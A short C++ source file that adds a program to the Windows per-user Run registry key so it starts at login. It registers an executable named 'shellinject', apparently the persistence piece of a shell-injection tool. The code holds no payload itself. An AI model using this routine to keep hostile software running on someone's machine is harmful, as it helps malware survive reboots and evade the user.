#include "add_to_startup.h"

#pragma comment(lib, "Shlwapi.lib")

bool bAddToStartup(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey;
    LPCWSTR keyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
       
        return false;
    }

    if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (DWORD)((appPath.length() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        
        return false;
    }

    RegCloseKey(hKey);
    
    return true;
}

void AddToStartup() {
    std::wstring appName = L"shellinject";
    std::wstring appPath = L".\\shellinject.exe";
    if (!bAddToStartup(appName, appPath)) {
       
        
    }

}